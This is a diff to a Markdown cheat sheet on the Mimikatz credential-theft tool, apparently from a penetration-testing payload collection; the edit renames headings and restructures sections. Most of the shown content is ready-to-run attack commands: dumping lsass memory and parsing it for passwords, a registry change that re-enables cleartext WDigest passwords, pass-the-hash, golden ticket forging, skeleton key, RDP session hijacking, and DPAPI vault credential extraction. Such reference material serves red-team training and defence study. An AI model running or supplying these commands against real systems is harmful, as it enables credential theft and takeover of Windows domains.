@@ -2,25 +2,25 @@
 
 ## Summary
 
-* [Mimikatz - Execute commands](#mimikatz---execute-commands)
-* [Mimikatz - Extract passwords](#mimikatz---extract-passwords)
-* [Mimikatz - LSA Protection Workaround](#mimikatz---lsa-protection-workaround)
-* [Mimikatz - Mini Dump](#mimikatz---mini-dump)
-* [Mimikatz - Pass The Hash](#mimikatz---pass-the-hash)
-* [Mimikatz - Golden ticket](#mimikatz---golden-ticket)
-* [Mimikatz - Skeleton key](#mimikatz---skeleton-key)
-* [Mimikatz - RDP session takeover](#mimikatz---rdp-session-takeover)
-* [Mimikatz - Credential Manager & DPAPI](#mimikatz---credential-manager--dpapi)
+* [Execute commands](#execute-commands)
+* [Extract passwords](#extract-passwords)
+* [LSA Protection Workaround](#lsa-protection-workaround)
+* [Mini Dump](#mini-dump)
+* [Pass The Hash](#pass-the-hash)
+* [Golden ticket](#golden-ticket)
+* [Skeleton key](#skeleton-key)
+* [RDP session takeover](#rdp-session-takeover)
+* [Credential Manager & DPAPI](#credential-manager--dpapi)
   * [Chrome Cookies & Credential](#chrome-cookies--credential)
   * [Task Scheduled credentials](#task-scheduled-credentials)
   * [Vault](#vault)
-* [Mimikatz - Commands list](#mimikatz---commands-list)
-* [Mimikatz - Powershell version](#mimikatz---powershell-version)
+* [Commands list](#commands-list)
+* [Powershell version](#powershell-version)
 * [References](#references)
 
 ![Data in memory](http://adsecurity.org/wp-content/uploads/2014/11/Delpy-CredentialDataChart.png)
 
-## Mimikatz - Execute commands
+## Execute commands
 
 Only one command
 
@@ -38,7 +38,7 @@ mimikatz # sekurlsa::logonpasswords
 mimikatz # sekurlsa::wdigest
 ```
 
-## Mimikatz - Extract passwords
+## Extract passwords
 
 > Microsoft disabled lsass clear text storage since Win8.1 / 2012R2+. It was backported (KB2871997) as a reg key on Win7 / 8 / 2008R2 / 2012 but clear text is still enabled.
 
@@ -63,7 +63,7 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLo
   * Adding requires lock
   * Removing requires reboot
 
-## Mimikatz - LSA Protection Workaround
+## LSA Protection Workaround
 
 - LSA as a Protected Process (RunAsPPL)
   ```powershell
@@ -108,7 +108,7 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLo
   ```
 
 
-## Mimikatz - Mini Dump
+## Mini Dump
 
 Dump the lsass process with `procdump`
 
@@ -132,22 +132,22 @@ rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsass_pid C:\temp\lsass.
 ```
 
 
+Use the minidump:
+* Mimikatz: `.\mimikatz.exe "sekurlsa::minidump lsass.dmp"`
+  ```powershell
+  mimikatz # sekurlsa::minidump lsass.dmp
+  mimikatz # sekurlsa::logonPasswords
+  ```
+* Pypykatz: `pypykatz lsa minidump lsass.dmp`
 
-Then load it inside Mimikatz.
 
-```powershell
-mimikatz # sekurlsa::minidump lsass.dmp
-Switch to minidump
-mimikatz # sekurlsa::logonPasswords
-```
-
-## Mimikatz - Pass The Hash
+## Pass The Hash
 
 ```powershell
 mimikatz # sekurlsa::pth /user:SCCM$ /domain:IDENTITY /ntlm:e722dfcd077a2b0bbe154a1b42872f4e /run:powershell
 ```
 
-## Mimikatz - Golden ticket
+## Golden ticket
 
 ```powershell
 .\mimikatz kerberos::golden /admin:ADMINACCOUNTNAME /domain:DOMAINFQDN /id:ACCOUNTRID /sid:DOMAINSID /krbtgt:KRBTGTPASSWORDHASH /ptt
@@ -157,7 +157,7 @@ mimikatz # sekurlsa::pth /user:SCCM$ /domain:IDENTITY /ntlm:e722dfcd077a2b0bbe15
 .\mimikatz "kerberos::golden /admin:DarthVader /domain:rd.lab.adsecurity.org /id:9999 /sid:S-1-5-21-135380161-102191138-581311202 /krbtgt:13026055d01f235d67634e109da03321 /startoffset:0 /endin:600 /renewmax:10080 /ptt" exit
 ```
 
-## Mimikatz - Skeleton key
+## Skeleton key
 
 ```powershell
 privilege::debug
@@ -168,17 +168,25 @@ net use p: \\WIN-PTELU2U07KG\admin$ /user:john mimikatz
 rdesktop 10.0.0.2:3389 -u test -p mimikatz -d pentestlab
 ```
 
-## Mimikatz - RDP session takeover
+## RDP session takeover
 
 Use `ts::multirdp` to patch the RDP service to allow more than two users.
 
-Run tscon.exe as the SYSTEM user, you can connect to any session without a password.
+* Enable privileges
+  ```powershell
+  privilege::debug 
+  token::elevate 
+  ```
+* List RDP sessions
+  ```powershell
+  ts::sessions
+  ```
+* Hijack session
+  ```powershell
+  ts::remote /id:2 
+  ```
 
-```powershell
-privilege::debug 
-token::elevate 
-ts::remote /id:2 
-```
+Run `tscon.exe` as the SYSTEM user, you can connect to any session without a password.
 
 ```powershell
 # get the Session ID you want to hijack
@@ -188,7 +196,7 @@ net start sesshijack
 ```
 
 
-## Mimikatz - Credential Manager & DPAPI
+## Credential Manager & DPAPI
 
 ```powershell
 # check the folder to find credentials
@@ -235,7 +243,7 @@ Attributes : 0
 vault::cred /in:C:\Users\demo\AppData\Local\Microsoft\Vault\"
 ```
 
-## Mimikatz - Commands list
+## Commands list
 
 | Command |Definition|
 |:----------------:|:---------------|
@@ -262,7 +270,7 @@ vault::cred /in:C:\Users\demo\AppData\Local\Microsoft\Vault\"
 |TOKEN::Elevate | impersonate a token. Used to elevate permissions to SYSTEM (default) or find a domain admin token on the box|
 |TOKEN::Elevate /domainadmin | impersonate a token with Domain Admin credentials.
 
-## Mimikatz - Powershell version
+## Powershell version
 
 Mimikatz in memory (no binary on disk) with :
 
